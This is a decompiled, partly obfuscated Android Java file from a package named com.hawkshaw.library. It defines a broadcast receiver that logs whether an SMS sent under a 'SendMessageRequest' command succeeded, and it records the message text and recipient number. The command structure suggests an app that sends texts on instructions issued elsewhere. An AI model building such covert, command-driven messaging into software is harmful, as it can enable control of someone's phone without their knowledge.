package com.hawkshaw.library.features.telephony.messages;

import Y1.K;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;

public final class SendMessageKt$receiver$1 extends BroadcastReceiver {
    final /* synthetic */ Command.SendMessageRequest $request;

    public SendMessageKt$receiver$1(Command.SendMessageRequest sendMessageRequest) {
        this.$request = sendMessageRequest;
    }

    public void onReceive(Context context, Intent intent) {
        String str;
        String str2;
        K.n(context, "context");
        K.n(intent, "intent");
        Logger logger = Logger.INSTANCE;
        Logger.d$default(logger, "SendMessage", C0528x.b("Received broadcast message: ", getResultCode()), false, 4, (Object) null);
        int resultCode = getResultCode();
        if (resultCode != -1) {
            str = "failed";
            str2 = resultCode != 1 ? resultCode != 2 ? resultCode != 3 ? resultCode != 4 ? C0528x.b("ResultCode: ", getResultCode()) : "No service." : "Error: Null PDU." : "Error: Radio off." : "Message not sent.";
        } else {
            str = "success";
            str2 = "Everything was good :-)";
        }
        StringBuilder g5 = C0528x.g("Message ", this.$request.getMessage(), " send to ", this.$request.getNumber(), " is ");
        g5.append(str);
        g5.append(", due to ");
        g5.append(str2);
        logger.log("SendMessage", g5.toString(), true);
        context.unregisterReceiver(this);
    }
}
